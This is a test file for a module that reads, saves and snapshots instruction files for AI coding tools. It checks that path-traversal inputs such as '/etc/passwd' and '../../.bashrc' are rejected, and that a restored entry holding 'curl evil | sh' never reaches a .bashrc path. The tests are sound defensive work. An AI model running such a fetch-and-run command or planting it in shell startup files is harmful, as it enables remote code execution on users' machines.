import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { AppError } from "../shared/errors";
import type { ToolConfig } from "../shared/types";
import {
  applyToolInstructionsSnapshot,
  createToolInstructionsRule,
  readToolInstructions,
  readToolInstructionsSnapshot,
  saveToolInstructions,
  toolInstructionsConflicts,
  toolInstructionsLayout,
  writeToolInstructionsSnapshot,
} from "./toolInstructions";

let root: string;

function tool(id: string, instructionsPath: string): ToolConfig {
  return {
    id,
    name: id,
    installRoots: { skill: [path.join(root, id, "skills")], agent: [] },
    instructionsPath,
  };
}

beforeEach(async () => {
  root = await mkdtemp(path.join(tmpdir(), "skillful-instructions-"));
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

describe("toolInstructionsLayout", () => {
  it("is null for tools without an instructions file", () => {
    expect(toolInstructionsLayout(tool("cursor", ""))).toBeNull();
  });

  it("is null for an instructions file that is not markdown", () => {
    expect(toolInstructionsLayout(tool("claude-code", path.join(root, ".bashrc")))).toBeNull();
  });

  it("only gives preset tools an override and rules folder", () => {
    const custom = toolInstructionsLayout(tool("custom", path.join(root, "AGENTS.md")));
    const codex = toolInstructionsLayout(tool("codex", path.join(root, "AGENTS.md")));
    expect(custom?.overrideFile).toBeNull();
    expect(codex?.overrideFile).toBe("AGENTS.override.md");
  });
});

describe("readToolInstructions", () => {
  it("lists a missing main file as empty, plus existing override and rules", async () => {
    const claude = tool("claude-code", path.join(root, "claude", "CLAUDE.md"));
    await mkdir(path.join(root, "claude", "rules", "nested"), { recursive: true });
    await writeFile(path.join(root, "claude", "rules", "git.md"), "git rule");
    await writeFile(path.join(root, "claude", "rules", "nested", "style.md"), "style rule");
    await writeFile(path.join(root, "claude", "rules", "notes.txt"), "ignored");

    const document = await readToolInstructions(claude);

    expect(document.rulesDirectory).toBe("rules");
    expect(
      document.files.map(({ relativePath, role, exists }) => [relativePath, role, exists])
    ).toEqual([
      ["CLAUDE.md", "main", false],
      ["rules/git.md", "rule", true],
      ["rules/nested/style.md", "rule", true],
    ]);
  });

  it("only lists the codex override when it exists", async () => {
    const codex = tool("codex", path.join(root, "codex", "AGENTS.md"));
    expect((await readToolInstructions(codex)).files.map((file) => file.role)).toEqual(["main"]);

    await mkdir(path.join(root, "codex"), { recursive: true });
    await writeFile(path.join(root, "codex", "AGENTS.override.md"), "override");
    expect((await readToolInstructions(codex)).files.map((file) => file.role)).toEqual([
      "main",
      "override",
    ]);
  });

  it("rejects tools without an instructions file", async () => {
    await expect(readToolInstructions(tool("cursor", ""))).rejects.toBeInstanceOf(AppError);
  });
});

describe("saveToolInstructions", () => {
  it("creates the main file and its folder on first save", async () => {
    const mainPath = path.join(root, "gemini", "GEMINI.md");
    const document = await saveToolInstructions(tool("gemini-cli", mainPath), [
      { relativePath: "GEMINI.md", content: "be brief", baseContent: null },
    ]);

    expect(await readFile(mainPath, "utf8")).toBe("be brief");
    expect(document.files[0]).toMatchObject({ exists: true, content: "be brief" });
  });

  it("refuses to overwrite a file that changed on disk unless told to", async () => {
    const mainPath = path.join(root, "CLAUDE.md");
    const claude = tool("claude-code", mainPath);
    await writeFile(mainPath, "edited by claude");
    const edit = { relativePath: "CLAUDE.md", content: "mine", baseContent: "original" };

    await expect(saveToolInstructions(claude, [edit])).rejects.toMatchObject({
      code: "tool-instructions-changed",
      details: { paths: ["CLAUDE.md"] },
    });
    expect(await readFile(mainPath, "utf8")).toBe("edited by claude");

    await saveToolInstructions(claude, [edit], { overwrite: true });
    expect(await readFile(mainPath, "utf8")).toBe("mine");
  });

  it.each(["../escape.md", "/etc/passwd", "rules/../../escape.md", "other.md", "rules/x.txt"])(
    "rejects %s",
    async (relativePath) => {
      const claude = tool("claude-code", path.join(root, "claude", "CLAUDE.md"));
      await expect(
        saveToolInstructions(claude, [{ relativePath, content: "x", baseContent: null }])
      ).rejects.toMatchObject({ code: "invalid-path" });
    }
  );

  it.skipIf(process.platform === "win32")(
    "keeps a symlinked instructions file linked",
    async () => {
      const realPath = path.join(root, "dotfiles", "CLAUDE.md");
      const linkPath = path.join(root, "claude", "CLAUDE.md");
      await mkdir(path.dirname(realPath), { recursive: true });
      await mkdir(path.dirname(linkPath), { recursive: true });
      await writeFile(realPath, "old");
      await symlink(realPath, linkPath);

      await saveToolInstructions(tool("claude-code", linkPath), [
        { relativePath: "CLAUDE.md", content: "new", baseContent: "old" },
      ]);

      expect(await readFile(realPath, "utf8")).toBe("new");
    }
  );
});

describe("createToolInstructionsRule", () => {
  it("creates an empty markdown rule and refuses duplicates", async () => {
    const claude = tool("claude-code", path.join(root, "claude", "CLAUDE.md"));
    const { relativePath, document } = await createToolInstructionsRule(claude, "testing");

    expect(relativePath).toBe("rules/testing.md");
    expect(document.files.some((file) => file.relativePath === "rules/testing.md")).toBe(true);
    await expect(createToolInstructionsRule(claude, "testing")).rejects.toMatchObject({
      code: "file-exists",
    });
  });

  it("is not available for tools without a rules folder", async () => {
    const codex = tool("codex", path.join(root, "AGENTS.md"));
    await expect(createToolInstructionsRule(codex, "x")).rejects.toMatchObject({
      code: "invalid-path",
    });
  });
});

describe("snapshots", () => {
  it("round-trips existing files and reports conflicting local edits", async () => {
    const snapshotRoot = path.join(root, "backup", "tool-instructions");
    const claude = tool("claude-code", path.join(root, "claude", "CLAUDE.md"));
    const codex = tool("codex", path.join(root, "codex", "AGENTS.md"));
    await mkdir(path.join(root, "claude", "rules"), { recursive: true });
    await writeFile(path.join(root, "claude", "CLAUDE.md"), "claude main");
    await writeFile(path.join(root, "claude", "rules", "git.md"), "git rule");

    await writeToolInstructionsSnapshot([claude, codex], snapshotRoot);
    const entries = await readToolInstructionsSnapshot(snapshotRoot);
    expect(entries.map(({ toolId, relativePath }) => `${toolId}/${relativePath}`)).toEqual([
      "claude-code/CLAUDE.md",
      "claude-code/rules/git.md",
    ]);

    await writeFile(path.join(root, "claude", "CLAUDE.md"), "changed locally");
    expect(await toolInstructionsConflicts([claude], entries)).toEqual([
      path.join(root, "claude", "CLAUDE.md"),
    ]);

    await applyToolInstructionsSnapshot([claude], entries);
    expect(await readFile(path.join(root, "claude", "CLAUDE.md"), "utf8")).toBe("claude main");
  });

  it("skips entries for unknown tools and paths that are not instruction files", async () => {
    const claude = tool("claude-code", path.join(root, "claude", "CLAUDE.md"));
    const written = await applyToolInstructionsSnapshot(
      [claude],
      [
        { toolId: "unknown", relativePath: "CLAUDE.md", content: "x" },
        { toolId: "claude-code", relativePath: "../../.bashrc", content: "x" },
        { toolId: "claude-code", relativePath: "CLAUDE.md", content: "restored" },
      ]
    );

    expect(written).toEqual([path.join(root, "claude", "CLAUDE.md")]);
  });

  it("never writes a restored entry to a non-markdown instructions path", async () => {
    const hijacked = tool("claude-code", path.join(root, ".bashrc"));
    const written = await applyToolInstructionsSnapshot(
      [hijacked],
      [{ toolId: "claude-code", relativePath: ".bashrc", content: "curl evil | sh" }]
    );

    expect(written).toEqual([]);
    await expect(readFile(path.join(root, ".bashrc"), "utf8")).rejects.toThrow();
  });
});
